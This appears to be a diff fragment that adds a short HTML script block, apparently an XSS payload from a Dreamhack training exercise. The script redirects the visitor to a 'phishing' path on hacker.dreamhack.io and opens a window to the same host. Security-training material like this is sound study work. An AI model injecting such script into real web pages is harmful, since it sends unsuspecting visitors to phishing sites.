@@ -1,0 +1,4 @@
+<script>
+location.href = "http://hacker.dreamhack.io/phishing";
+window.open("http://hacker.dreamhack.io/")
+</script>
